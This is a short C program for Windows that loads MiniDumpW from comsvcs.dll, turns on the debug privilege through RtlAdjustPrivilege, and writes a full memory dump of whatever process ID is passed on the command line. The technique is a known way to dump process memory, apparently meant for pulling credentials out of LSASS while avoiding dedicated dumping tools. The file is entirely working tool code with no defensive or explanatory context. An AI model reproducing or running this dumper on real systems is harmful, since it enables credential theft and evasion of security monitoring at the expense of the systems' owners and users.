#define UNICODE
#include <windows.h>
#include <stdio.h>

typedef HRESULT (WINAPI *_MiniDumpW)(
  DWORD arg1, DWORD arg2, PWCHAR cmdline);
  
typedef NTSTATUS (WINAPI *_RtlAdjustPrivilege)(
  ULONG Privilege, BOOL Enable, 
  BOOL CurrentThread, PULONG Enabled);

// "<pid> <dump.bin> full"
int wmain(int argc, wchar_t *argv[]) {
    HRESULT             hr;
    _MiniDumpW          MiniDumpW;
    _RtlAdjustPrivilege RtlAdjustPrivilege;
    ULONG               t;
    
    MiniDumpW          = (_MiniDumpW)GetProcAddress(
      LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
      
    RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(
      GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");
    
    if(MiniDumpW == NULL) {
      printf("Unable to resolve COMSVCS!MiniDumpW.\n");
      return 0;
    }
    // try enable debug privilege
    RtlAdjustPrivilege(20, TRUE, FALSE, &t);
        
    printf("Invoking COMSVCS!MiniDumpW(\"%ws\")\n", argv[1]);
   
    // dump process
    MiniDumpW(0, 0,  argv[1]);
    printf("OK!\n");
    
    return 0;
}


